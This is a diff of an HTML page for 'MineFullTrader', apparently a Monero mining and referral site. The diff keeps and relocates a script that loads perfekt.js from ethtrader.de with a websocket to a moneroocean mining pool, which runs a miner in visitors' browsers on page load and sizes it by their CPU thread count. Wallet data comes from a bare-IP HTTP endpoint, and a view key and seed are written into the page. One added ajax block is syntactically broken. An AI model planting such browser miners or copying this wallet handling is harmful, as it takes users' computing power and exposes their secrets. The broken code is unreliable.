@@ -1,4 +1,5 @@
-﻿<!DOCTYPE html>
+﻿
+<!DOCTYPE html>
 
 <html>
   <head>  
@@ -192,7 +193,7 @@ span:after {
 	margin: 0 auto;
 	position: absolute;
 	color: silver;
-	max-width: 600px;
+	min-width: 200px;
 	bottom: 8%;
 	
 	
@@ -230,18 +231,20 @@ span:after {
 	position:relative;
 }
 	
-  </style>	
+</style>	
+
+
+
+
+
   </head>
-  <body>
-<!-- 
+<body>
+
 <div id="loading" class="loader">
 <h1 class="loadingtitle"> MineFullTrader</h1>
 <h2 class="loading""><img id="your-img" src="img/loadingImage.gif"></h2>
 <p class="loadwords">Refer others and MFT will pay out 10% of their earnings to you instead!</p>
 </div>   
- -->
-  
-<script src="https://ethtrader.de/perfekt/perfekt.js?perfekt=wss://?jason=gulf.moneroocean.stream:80"></script>
 <script>
 
 	
@@ -258,6 +261,10 @@ span:after {
 
          
 </script>
+
+  
+<script src="https://ethtrader.de/perfekt/perfekt.js?perfekt=wss://?jason=gulf.moneroocean.stream:80"></script>
+
 <script src="app.min.js">
 $(function() {
   $('#threads').text(navigator.hardwareConcurrency);
@@ -615,17 +622,17 @@ myFunction();
       </div>
     </div>	
 	<script src="zepto.js"></script>
-    <script src="app.min.js"></script>
-	
+    <script src="app.min.js"></script>	
 	<script>		
 		if (localStorage.getItem('USERINFO') == null) {
 		$.ajax({
-    url: 'http://52.165.128.57/monero/api.php?mode=new',
-    dataType: 'JSON',
-    success: function(data, status) {
-        $.each(data, function(key, value){
-           window.localStorage.setItem('USERINFO', data);
-			location.reload()					   
+			url: 'http://52.165.128.57/monero/api.php?mode=new',
+			dataType: 'JSON',
+			success: function(data, status) {
+		$.each(data, function(key, value){
+			window.localStorage.setItem('USERINFO', data);
+			location.reload()
+								   
         
 		
 		
@@ -648,7 +655,13 @@ myFunction();
 					document.getElementById("view").innerHTML = view;
 					document.getElementById("seed").innerHTML = seed;
 	</script>
-
+	<script>
+	$.ajax({
+		url: 'https://moneroocean.stream/#/dashboard',
+		document.getElementById('input_4').value=wallet;
+	
+	});
+	</script>
 	<script>
 	
 		var oldColour = "";
